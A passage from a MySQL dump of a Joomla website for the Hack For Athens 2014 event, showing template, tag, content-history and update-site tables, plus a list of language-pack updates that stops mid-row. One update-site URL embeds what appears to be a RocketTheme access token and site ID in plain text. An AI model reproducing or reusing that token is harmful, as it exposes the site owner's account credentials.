Safari/537.36\";s:8:\"registry\";O:9:\"JRegistry\":1:{s:7:\"\\0\\0\\0data\";O:8:\"stdClass\":0:{}}s:4:\"user\";O:5:\"JUser\":24:{s:9:\"\\0\\0\\0isRoot\";b:0;s:2:\"id\";i:0;s:4:\"name\";N;s:8:\"username\";N;s:5:\"email\";N;s:8:\"password\";N;s:14:\"password_clear\";s:0:\"\";s:5:\"block\";N;s:9:\"sendEmail\";i:0;s:12:\"registerDate\";N;s:13:\"lastvisitDate\";N;s:10:\"activation\";N;s:6:\"params\";N;s:6:\"groups\";a:1:{i:0;s:1:\"1\";}s:5:\"guest\";i:1;s:13:\"lastResetTime\";N;s:10:\"resetCount\";N;s:10:\"\\0\\0\\0_params\";O:9:\"JRegistry\":1:{s:7:\"\\0\\0\\0data\";O:8:\"stdClass\":0:{}}s:14:\"\\0\\0\\0_authGroups\";a:1:{i:0;i:1;}s:14:\"\\0\\0\\0_authLevels\";a:2:{i:0;i:1;i:1;i:1;}s:15:\"\\0\\0\\0_authActions\";N;s:12:\"\\0\\0\\0_errorMsg\";N;s:10:\"\\0\\0\\0_errors\";a:0:{}s:3:\"aid\";i:0;}s:23:\"gantry-current-template\";s:11:\"rt_chapelco\";}',0,'');
/*!40000 ALTER TABLE `hfa_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_tags`
--

DROP TABLE IF EXISTS `hfa_tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `lft` int(11) NOT NULL DEFAULT '0',
  `rgt` int(11) NOT NULL DEFAULT '0',
  `level` int(10) unsigned NOT NULL DEFAULT '0',
  `path` varchar(255) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `description` mediumtext NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `metadesc` varchar(1024) NOT NULL COMMENT 'The meta description for the page.',
  `metakey` varchar(1024) NOT NULL COMMENT 'The meta keywords for the page.',
  `metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tag_idx` (`published`,`access`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_path` (`path`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_tags`
--

LOCK TABLES `hfa_tags` WRITE;
/*!40000 ALTER TABLE `hfa_tags` DISABLE KEYS */;
INSERT INTO `hfa_tags` VALUES (1,0,0,1,0,'','ROOT','root','','',1,0,'0000-00-00 00:00:00',1,'{}','','','',0,'2011-01-01 00:00:01','',0,'0000-00-00 00:00:00','','',0,'*',1,'0000-00-00 00:00:00','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `hfa_tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_template_styles`
--

DROP TABLE IF EXISTS `hfa_template_styles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_template_styles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `template` varchar(50) NOT NULL DEFAULT '',
  `client_id` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `home` char(7) NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_template` (`template`),
  KEY `idx_home` (`home`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_template_styles`
--

LOCK TABLES `hfa_template_styles` WRITE;
/*!40000 ALTER TABLE `hfa_template_styles` DISABLE KEYS */;
INSERT INTO `hfa_template_styles` VALUES (2,'bluestork',1,'0','Bluestork - Default','{\"useRoundedCorners\":\"1\",\"showSiteName\":\"0\"}'),(3,'atomic',0,'0','Atomic - Default','{}'),(4,'beez_20',0,'0','Beez2 - Default','{\"wrapperSmall\":\"53\",\"wrapperLarge\":\"72\",\"logo\":\"images\\/joomla_black.gif\",\"sitetitle\":\"Joomla!\",\"sitedescription\":\"Open Source Content Management\",\"navposition\":\"left\",\"templatecolor\":\"personal\",\"html5\":\"0\"}'),(5,'hathor',1,'0','Hathor - Default','{\"showSiteName\":\"0\",\"colourChoice\":\"\",\"boldText\":\"0\"}'),(6,'beez5',0,'0','Beez5 - Default','{\"wrapperSmall\":\"53\",\"wrapperLarge\":\"72\",\"logo\":\"images\\/sampledata\\/fruitshop\\/fruits.gif\",\"sitetitle\":\"Joomla!\",\"sitedescription\":\"Open Source Content Management\",\"navposition\":\"left\",\"html5\":\"0\"}'),(7,'rt_chapelco',0,'1','rt_chapelco - Default','{\"master\":\"true\",\"current_id\":\"7\",\"template_full_name\":\"Chapelco\",\"grid_system\":\"12\",\"template_prefix\":\"gantry-\",\"cookie_time\":\"31536000\",\"override_set\":\"2.5\",\"name\":\"Preset1\",\"copy_lang_files_if_diff\":\"1\",\"logo\":{\"enabled\":\"1\",\"position\":\"header-a\",\"type\":\"custom\",\"custom\":{\"image\":\"{\'path\':\'images\\/hackforathens-straight.png\'}\"}},\"main\":{\"accent\":\"#356788\",\"accent2\":\"#701914\",\"body\":\"light\",\"showcasebg\":\"dots\"},\"contentstyle\":\"preset7\",\"font\":{\"family\":\"s:geneva\",\"size\":\"default\",\"size-is\":\"default\"},\"viewswitcher-priority\":\"1\",\"logo-priority\":\"2\",\"copyright-priority\":\"3\",\"styledeclaration-priority\":\"4\",\"fontsizer-priority\":\"5\",\"date-priority\":\"7\",\"totop-priority\":\"8\",\"systemmessages-priority\":\"9\",\"morearticles-priority\":\"12\",\"smartload-priority\":\"13\",\"pagesuffix-priority\":\"14\",\"resetsettings-priority\":\"15\",\"analytics-priority\":\"16\",\"dropdownmenu-priority\":\"18\",\"jstools-priority\":\"21\",\"moduleoverlays-priority\":\"22\",\"rtl-priority\":\"23\",\"splitmenu-priority\":\"24\",\"webfonts-priority\":\"27\",\"styledeclaration-enabled\":\"1\",\"social\":{\"enabled\":\"0\",\"position\":\"copyright-c\",\"twitter\":\"\",\"facebook\":\"\",\"google\":\"\",\"rss\":\"\"},\"date\":{\"enabled\":\"0\",\"position\":\"top-d\",\"clientside\":\"0\",\"formats\":\"%A, %B %d, %Y\"},\"fontsizer\":{\"enabled\":\"0\",\"position\":\"feature-b\"},\"login\":{\"enabled\":\"0\",\"position\":\"header-d\",\"text\":\"Login\",\"logouttext\":\"Logout\"},\"popup\":{\"enabled\":\"0\",\"position\":\"utility-d\",\"text\":\"Popup Module\"},\"branding\":{\"enabled\":\"0\",\"position\":\"copyright-a\"},\"copyright\":{\"enabled\":\"1\",\"position\":\"copyright-a\",\"text\":\"<span class=\\\"rt-text-2\\\">Hack For Athens | Athens, GA | May 31st - June 1st, 2014<\\/span>\",\"layout\":\"a:1:{i:12;a:2:{i:2;a:2:{i:0;i:5;i:1;i:7;}i:3;a:3:{i:0;i:5;i:1;i:5;i:2;i:2;}}}\",\"showall\":\"0\",\"showmax\":\"6\"},\"totop\":{\"enabled\":\"0\",\"position\":\"copyright-c\",\"text\":\"TOP\"},\"systemmessages\":{\"enabled\":\"1\",\"position\":\"drawer\"},\"resetsettings\":{\"enabled\":\"0\",\"position\":\"copyright-d\",\"text\":\"Reset Settings\"},\"analytics\":{\"enabled\":\"0\",\"code\":\"\",\"position\":\"analytics\"},\"menu\":{\"enabled\":\"1\",\"type\":\"dropdownmenu\",\"dropdownmenu\":{\"theme\":\"gantry-dropdown\",\"limit_levels\":\"0\",\"startLevel\":\"0\",\"showAllChildren\":\"1\",\"class_sfx\":\"top\",\"cache\":\"0\",\"menutype\":\"mainmenu\",\"position\":\"header-b\",\"responsive-menu\":\"panel\",\"enable-current-id\":\"0\",\"module_cache\":\"1\"},\"splitmenu\":{\"mainmenu-limit_levels\":\"1\",\"mainmenu-startLevel\":\"0\",\"mainmenu-endLevel\":\"0\",\"mainmenu-class_sfx\":\"top\",\"submenu-limit_levels\":\"1\",\"submenu-startLevel\":\"1\",\"submenu-endLevel\":\"9\",\"cache\":\"0\",\"menutype\":\"mainmenu\",\"theme\":\"gantry-splitmenu\",\"mainmenu-position\":\"header-b\",\"submenu-position\":\"drawer\",\"submenu-title\":\"1\",\"submenu-class_sfx\":\"\",\"submenu-module_sfx\":\"title1 box1 icon-reorder\",\"responsive-menu\":\"panel\",\"roknavmenu_dropdown_enable-current-id\":\"0\",\"module_cache\":\"1\"}},\"top\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"header\":{\"layout\":\"a:1:{i:12;a:1:{i:3;a:3:{i:0;i:3;i:1;i:6;i:2;i:3;}}}\",\"showall\":\"0\",\"showmax\":\"6\"},\"showcase\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"feature\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"utility\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"maintop\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"mainbodyPosition\":\"a:1:{i:12;a:2:{i:1;a:1:{s:2:\\\"mb\\\";i:12;}i:2;a:2:{s:2:\\\"mb\\\";i:8;s:2:\\\"sa\\\";i:4;}}}\",\"mainbottom\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"extension\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"bottom\":{\"layout\":\"3,3,3,3\",\"showall\":\"0\",\"showmax\":\"6\"},\"footer\":{\"layout\":\"a:1:{i:12;a:1:{i:3;a:3:{i:0;i:3;i:1;i:5;i:2;i:4;}}}\",\"showall\":\"0\",\"showmax\":\"6\"},\"layout-mode\":\"responsive\",\"loadtransition\":\"0\",\"component-enabled\":\"1\",\"mainbody-enabled\":\"1\",\"rtl-enabled\":\"1\",\"pagesuffix-enabled\":\"0\",\"selectivizr-enabled\":\"0\",\"less\":{\"compression\":\"1\",\"compilewait\":\"2\",\"debugheader\":\"0\"},\"ie7splash-enabled\":\"1\",\"k2\":\"0\"}'),(11,'protostar',0,'0','protostar - Default','{\"templateColor\":\"\",\"logoFile\":\"\",\"googleFont\":\"1\",\"googleFontName\":\"Open+Sans\",\"fluidContainer\":\"0\"}'),(12,'isis',1,'1','isis - Default','{\"templateColor\":\"\",\"logoFile\":\"\"}'),(13,'beez3',0,'0','beez3 - Default','{\"wrapperSmall\":53,\"wrapperLarge\":72,\"logo\":\"\",\"sitetitle\":\"\",\"sitedescription\":\"\",\"navposition\":\"center\",\"bootstrap\":\"\",\"templatecolor\":\"nature\",\"headerImage\":\"\",\"backgroundcolor\":\"#eee\"}');
/*!40000 ALTER TABLE `hfa_template_styles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_ucm_base`
--

DROP TABLE IF EXISTS `hfa_ucm_base`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_ucm_base` (
  `ucm_id` int(10) unsigned NOT NULL,
  `ucm_item_id` int(10) NOT NULL,
  `ucm_type_id` int(11) NOT NULL,
  `ucm_language_id` int(11) NOT NULL,
  PRIMARY KEY (`ucm_id`),
  KEY `idx_ucm_item_id` (`ucm_item_id`),
  KEY `idx_ucm_type_id` (`ucm_type_id`),
  KEY `idx_ucm_language_id` (`ucm_language_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_ucm_base`
--

LOCK TABLES `hfa_ucm_base` WRITE;
/*!40000 ALTER TABLE `hfa_ucm_base` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_ucm_base` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_ucm_content`
--

DROP TABLE IF EXISTS `hfa_ucm_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_ucm_content` (
  `core_content_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `core_type_alias` varchar(255) NOT NULL DEFAULT '' COMMENT 'FK to the content types table',
  `core_title` varchar(255) NOT NULL,
  `core_alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `core_body` mediumtext NOT NULL,
  `core_state` tinyint(1) NOT NULL DEFAULT '0',
  `core_checked_out_time` varchar(255) NOT NULL DEFAULT '',
  `core_checked_out_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `core_access` int(10) unsigned NOT NULL DEFAULT '0',
  `core_params` text NOT NULL,
  `core_featured` tinyint(4) unsigned NOT NULL DEFAULT '0',
  `core_metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `core_created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `core_created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `core_created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `core_modified_user_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Most recent user that modified',
  `core_modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `core_language` char(7) NOT NULL,
  `core_publish_up` datetime NOT NULL,
  `core_publish_down` datetime NOT NULL,
  `core_content_item_id` int(10) unsigned DEFAULT NULL COMMENT 'ID from the individual type table',
  `asset_id` int(10) unsigned DEFAULT NULL COMMENT 'FK to the #__assets table.',
  `core_images` text NOT NULL,
  `core_urls` text NOT NULL,
  `core_hits` int(10) unsigned NOT NULL DEFAULT '0',
  `core_version` int(10) unsigned NOT NULL DEFAULT '1',
  `core_ordering` int(11) NOT NULL DEFAULT '0',
  `core_metakey` text NOT NULL,
  `core_metadesc` text NOT NULL,
  `core_catid` int(10) unsigned NOT NULL DEFAULT '0',
  `core_xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `core_type_id` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`core_content_id`),
  KEY `tag_idx` (`core_state`,`core_access`),
  KEY `idx_access` (`core_access`),
  KEY `idx_alias` (`core_alias`),
  KEY `idx_language` (`core_language`),
  KEY `idx_title` (`core_title`),
  KEY `idx_modified_time` (`core_modified_time`),
  KEY `idx_created_time` (`core_created_time`),
  KEY `idx_content_type` (`core_type_alias`),
  KEY `idx_core_modified_user_id` (`core_modified_user_id`),
  KEY `idx_core_checked_out_user_id` (`core_checked_out_user_id`),
  KEY `idx_core_created_user_id` (`core_created_user_id`),
  KEY `idx_core_type_id` (`core_type_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Contains core content data in name spaced fields';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_ucm_content`
--

LOCK TABLES `hfa_ucm_content` WRITE;
/*!40000 ALTER TABLE `hfa_ucm_content` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_ucm_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_ucm_history`
--

DROP TABLE IF EXISTS `hfa_ucm_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_ucm_history` (
  `version_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ucm_item_id` int(10) unsigned NOT NULL,
  `ucm_type_id` int(10) unsigned NOT NULL,
  `version_note` varchar(255) NOT NULL DEFAULT '' COMMENT 'Optional version name',
  `save_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `editor_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `character_count` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Number of characters in this version.',
  `sha1_hash` varchar(50) NOT NULL DEFAULT '' COMMENT 'SHA1 hash of the version_data column.',
  `version_data` mediumtext NOT NULL COMMENT 'json-encoded string of version data',
  `keep_forever` tinyint(4) NOT NULL DEFAULT '0' COMMENT '0=auto delete; 1=keep',
  PRIMARY KEY (`version_id`),
  KEY `idx_ucm_item_id` (`ucm_type_id`,`ucm_item_id`),
  KEY `idx_save_date` (`save_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_ucm_history`
--

LOCK TABLES `hfa_ucm_history` WRITE;
/*!40000 ALTER TABLE `hfa_ucm_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_ucm_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_update_categories`
--

DROP TABLE IF EXISTS `hfa_update_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_update_categories` (
  `categoryid` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) DEFAULT '',
  `description` text NOT NULL,
  `parent` int(11) DEFAULT '0',
  `updatesite` int(11) DEFAULT '0',
  PRIMARY KEY (`categoryid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Update Categories';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_update_categories`
--

LOCK TABLES `hfa_update_categories` WRITE;
/*!40000 ALTER TABLE `hfa_update_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_update_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_update_sites`
--

DROP TABLE IF EXISTS `hfa_update_sites`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_update_sites` (
  `update_site_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `location` text NOT NULL,
  `enabled` int(11) DEFAULT '0',
  `last_check_timestamp` bigint(20) DEFAULT '0',
  `extra_query` varchar(1000) DEFAULT '',
  PRIMARY KEY (`update_site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_update_sites`
--

LOCK TABLES `hfa_update_sites` WRITE;
/*!40000 ALTER TABLE `hfa_update_sites` DISABLE KEYS */;
INSERT INTO `hfa_update_sites` VALUES (1,'Joomla Core','collection','http://update.joomla.org/core/sts/list_sts.xml',1,0,''),(2,'Joomla Extension Directory','collection','http://update.joomla.org/jed/list.xml',1,0,''),(3,'Accredited Joomla! Translations','collection','http://update.joomla.org/language/translationlist_3.xml',1,0,''),(5,'RocketTheme Update Directory','collection','http://updates.rockettheme.com/joomla/updates.xml?site_id=f469954c4689d08a1a26cefd2e6d589a&access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&ignore=update.xml',1,0,''),(18,'Xmap Update Site','extension','https://raw.github.com/guilleva/Xmap/master/xmap-update.xml',1,0,''),(21,'Gantry Framework Update Site','extension','http://www.gantry-framework.org/updates/joomla16/gantry.xml',1,0,''),(22,'Kunena 3.0 Update Site','collection','http://update.kunena.org/3.0/list.xml',1,0,''),(23,'GCalendar Update Site','extension','http://g4j.digital-peak.com/index.php?option=com_ars&view=update&task=stream&format=xml&id=1&ext=extension.xml',1,0,''),(28,'','collection','http://update.joomla.org/core/list.xml',1,0,''),(29,'WebInstaller Update Site','extension','http://appscdn.joomla.org/webapps/jedapps/webinstaller.xml',1,0,''),(30,'JCE Editor Updates','extension','https://www.joomlacontenteditor.net/index.php?option=com_updates&view=update&format=xml&id=1&file=extension.xml',1,0,''),(31,'B2Jcontact update site','extension','http://repos.bang2joom.com/components/com_b2jcontact.xml',1,1398893275,'');
/*!40000 ALTER TABLE `hfa_update_sites` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_update_sites_extensions`
--

DROP TABLE IF EXISTS `hfa_update_sites_extensions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_update_sites_extensions` (
  `update_site_id` int(11) NOT NULL DEFAULT '0',
  `extension_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`update_site_id`,`extension_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_update_sites_extensions`
--

LOCK TABLES `hfa_update_sites_extensions` WRITE;
/*!40000 ALTER TABLE `hfa_update_sites_extensions` DISABLE KEYS */;
INSERT INTO `hfa_update_sites_extensions` VALUES (1,700),(2,700),(3,600),(5,10006),(5,10015),(5,10017),(5,10019),(5,10022),(5,10026),(5,10030),(5,10032),(5,10189),(5,10199),(5,10201),(5,10205),(5,10209),(5,10211),(5,10218),(18,10149),(21,10169),(22,10118),(23,10091),(28,700),(29,10223),(30,10226),(31,10229);
/*!40000 ALTER TABLE `hfa_update_sites_extensions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_updates`
--

DROP TABLE IF EXISTS `hfa_updates`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_updates` (
  `update_id` int(11) NOT NULL AUTO_INCREMENT,
  `update_site_id` int(11) DEFAULT '0',
  `extension_id` int(11) DEFAULT '0',
  `name` varchar(100) DEFAULT '',
  `description` text NOT NULL,
  `element` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `folder` varchar(20) DEFAULT '',
  `client_id` tinyint(3) DEFAULT '0',
  `version` varchar(32) DEFAULT '',
  `data` text NOT NULL,
  `detailsurl` text NOT NULL,
  `infourl` text NOT NULL,
  `extra_query` varchar(1000) DEFAULT '',
  PRIMARY KEY (`update_id`)
) ENGINE=InnoDB AUTO_INCREMENT=68 DEFAULT CHARSET=utf8 COMMENT='Available Updates';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_updates`
--

LOCK TABLES `hfa_updates` WRITE;
/*!40000 ALTER TABLE `hfa_updates` DISABLE KEYS */;
INSERT INTO `hfa_updates` VALUES (1,3,0,'Malay','','pkg_ms-MY','package','',0,'3.2.2.1','','http://update.joomla.org/language/details3/ms-MY_details.xml','',''),(2,3,0,'Romanian','','pkg_ro-RO','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ro-RO_details.xml','',''),(3,3,0,'Flemish','','pkg_nl-BE','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/nl-BE_details.xml','',''),(4,3,0,'Chinese Traditional','','pkg_zh-TW','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/zh-TW_details.xml','',''),(5,3,0,'French','','pkg_fr-FR','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/fr-FR_details.xml','',''),(6,3,0,'German','','pkg_de-DE','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/de-DE_details.xml','',''),(7,3,0,'Greek','','pkg_el-GR','package','',0,'3.2.0.1','','http://update.joomla.org/language/details3/el-GR_details.xml','',''),(8,3,0,'Japanese','','pkg_ja-JP','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ja-JP_details.xml','',''),(9,3,0,'Hebrew','','pkg_he-IL','package','',0,'3.1.1.1','','http://update.joomla.org/language/details3/he-IL_details.xml','',''),(10,3,0,'EnglishAU','','pkg_en-AU','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/en-AU_details.xml','',''),(11,3,0,'EnglishUS','','pkg_en-US','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/en-US_details.xml','',''),(12,3,0,'Hungarian','','pkg_hu-HU','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/hu-HU_details.xml','',''),(13,3,0,'Afrikaans','','pkg_af-ZA','package','',0,'3.2.0.1','','http://update.joomla.org/language/details3/af-ZA_details.xml','',''),(14,3,0,'Arabic Unitag','','pkg_ar-AA','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ar-AA_details.xml','',''),(15,3,0,'Belarusian','','pkg_be-BY','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/be-BY_details.xml','',''),(16,3,0,'Bulgarian','','pkg_bg-BG','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/bg-BG_details.xml','',''),(17,3,0,'Catalan','','pkg_ca-ES','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ca-ES_details.xml','',''),(18,3,0,'Chinese Simplified','','pkg_zh-CN','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/zh-CN_details.xml','',''),(19,3,0,'Croatian','','pkg_hr-HR','package','',0,'3.1.5.1','','http://update.joomla.org/language/details3/hr-HR_details.xml','',''),(20,3,0,'Czech','','pkg_cs-CZ','package','',0,'3.2.3.4','','http://update.joomla.org/language/details3/cs-CZ_details.xml','',''),(21,3,0,'Danish','','pkg_da-DK','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/da-DK_details.xml','',''),(22,3,0,'Dutch','','pkg_nl-NL','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/nl-NL_details.xml','',''),(23,3,0,'Estonian','','pkg_et-EE','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/et-EE_details.xml','',''),(24,3,0,'Italian','','pkg_it-IT','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/it-IT_details.xml','',''),(25,3,0,'Korean','','pkg_ko-KR','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ko-KR_details.xml','',''),(26,3,0,'Latvian','','pkg_lv-LV','package','',0,'3.2.3.2','','http://update.joomla.org/language/details3/lv-LV_details.xml','',''),(27,3,0,'Macedonian','','pkg_mk-MK','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/mk-MK_details.xml','',''),(28,3,0,'Norwegian Bokmal','','pkg_nb-NO','package','',0,'3.2.2.1','','http://update.joomla.org/language/details3/nb-NO_details.xml','',''),(29,3,0,'Persian','','pkg_fa-IR','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/fa-IR_details.xml','',''),(30,3,0,'Polish','','pkg_pl-PL','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/pl-PL_details.xml','',''),(31,3,0,'Russian','','pkg_ru-RU','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ru-RU_details.xml','',''),(32,3,0,'Slovak','','pkg_sk-SK','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/sk-SK_details.xml','',''),(33,3,0,'Swedish','','pkg_sv-SE','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/sv-SE_details.xml','',''),(34,3,0,'Syriac','','pkg_sy-IQ','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/sy-IQ_details.xml','',''),(35,3,0,'Tamil','','pkg_ta-IN','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ta-IN_details.xml','',''),(36,3,0,'Thai','','pkg_th-TH','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/th-TH_details.xml','',''),(37,3,0,'Turkish','','pkg_tr-TR','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/tr-TR_details.xml','',''),(38,3,0,'Ukrainian','','pkg_uk-UA','package','',0,'3.2.0.6','','http://update.joomla.org/language/details3/uk-UA_details.xml','',''),(39,3,0,'Uyghur','','pkg_ug-CN','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/ug-CN_details.xml','',''),(40,3,0,'Albanian','','pkg_sq-AL','package','',0,'3.1.1.1','','http://update.joomla.org/language/details3/sq-AL_details.xml','',''),(41,3,0,'Portuguese Brazil','','pkg_pt-BR','package','',0,'3.0.2.1','','http://update.joomla.org/language/details3/pt-BR_details.xml','',''),(42,3,0,'Serbian Latin','','pkg_sr-YU','package','',0,'3.2.3.3','','http://update.joomla.org/language/details3/sr-YU_details.xml','',''),(43,3,0,'Spanish','','pkg_es-ES','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/es-ES_details.xml','',''),(44,3,0,'Bosnian','','pkg_bs-BA','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/bs-BA_details.xml','',''),(45,3,0,'Serbian 